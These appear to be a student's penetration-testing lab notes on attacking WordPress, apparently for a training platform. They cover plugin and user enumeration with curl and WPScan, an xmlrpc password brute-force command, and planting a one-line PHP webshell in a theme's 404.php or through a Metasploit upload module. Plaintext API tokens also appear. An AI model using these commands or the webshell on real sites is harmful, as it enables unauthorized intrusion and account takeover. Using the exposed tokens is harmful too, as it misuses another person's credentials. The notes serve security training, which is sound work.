check `/robots.txt`
check `/wp-login, /wp-admin` 

##  Version Discovery

```shell-session
$ curl -s http://blog.inlanefreight.local | grep WordPress

<meta name="generator" content="WordPress 5.8" />
```

#### Themes`
```
 curl -s http://blog.inlanefreight.local | grep themes
```

#### what plugins installed?

```
 curl -s http://blog.inlanefreight.local | grep plugins
<link  id='contact-form-7-css' /plugins/contact-form-7/i' 
<link rel='stylesheet' id='wpdiscuz-frontend-css-css' 
```
 look for CVEs on them.
## what users exist?

This makes WordPress vulnerable to username enumeration, which can be used to obtain a list of potential usernames.

## ## WPScan

[WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable.

![](Pasted%20image%2020250211153333.png)
WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`.

The `--enumerate` flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups.
`run wpscan in docker`
```
$ sudo docker run -it --rm --network host wpscanteam/wpscan --url http://blog.inlanefreight.local --enumerate --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs

```


`wpscan password bruteforce`
```shell-session
$ sudo wpscan --password-attack xmlrpc -t 20 -U doug -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```


#### Creating a webshell
select an unused theme and an unusual page, `404.php` select ninteen and 404
![](Pasted%20image%2020250211200810.png)
##### Simple test
```php
system($_GET[0]);
```

#### interactive webshell

`metasploit`
```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
# info:
This module takes an administrator username and password, logs into the admin panel, and uploads a payload packaged as a WordPress plugin. Because this is authenticated code execution by design, it should work on all versions of WordPress.
```
https://github.com/p0dalirius/Wordpress-webshell-plugin

![](Pasted%20image%2020250211212237.png)




================================================
`lab`
![](Pasted%20image%2020250211132204.png)
after browsing the readme, mail-masta 1 is in use.


start searching for vulns when done enumerating obviously, 


Wpscan
https://wpscan.com/profile/

```
api: PozBOhbkIixUcbMR3tvMaHCZN0bvhCYclspMdCyYsco

```

`run wpscan in docker`
```
└─$ sudo docker run -it --rm --network host wpscanteam/wpscan --url http://blog.inlanefreight.local --enumerate --api-token a3VkBJyg1rMIahRVYtQXpWAEXl6ixXyoSCG3tDL5xzs

```


=========================================
## Some notes that might help you

WordPress stores its plugins in the `wp-content/plugins` directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the `wp-content/themes` directory. These files should be carefully enumerated as they may lead to RCE.


# AUTHORIZATION LEVELS
There are five types of users on a standard WordPress installation.

1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
2. Editor: An editor can publish and manage posts, including the posts of other users.
3. Author: They can publish and manage their own posts.
4. Contributor: These users can write and manage their own posts but cannot publish them.
5. Subscriber: These are standard users who can browse posts and edit their profiles.
